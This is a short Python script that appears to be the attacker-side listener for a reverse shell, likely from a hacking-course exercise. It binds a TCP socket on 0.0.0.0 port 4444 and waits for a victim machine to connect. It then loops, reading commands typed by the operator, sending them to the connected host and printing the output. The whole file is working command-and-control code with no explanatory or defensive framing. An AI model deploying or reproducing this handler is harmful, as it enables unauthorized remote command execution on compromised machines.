#!/usr/bin/python
import socket
import json

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print("Listening...")
        self.connection, self.address = listener.accept()
        print("[+] Got connection from " + str(self.address))

    # def reliable_send(self, data):
    #     json_data = json.dumps(data)
    #     self.connection.send(json_data.encode("utf-8"))
    #
    # def reliable_receive(self):
    #     json_data = self.connection.recv(1024)
    #     return json.loads(json_data)

    def exec(self, command):
        self.connection.sendall(bytes(command, 'utf-8'))
        return self.connection.recv(1024)
        # self.reliable_send(command)
        # return self.reliable_receive()

    def run(self):
        while True:
            command = input(">> ")
            res = self.exec(command)
            print(res)

myListener = Listener(ip="0.0.0.0", port=4444)
myListener.run()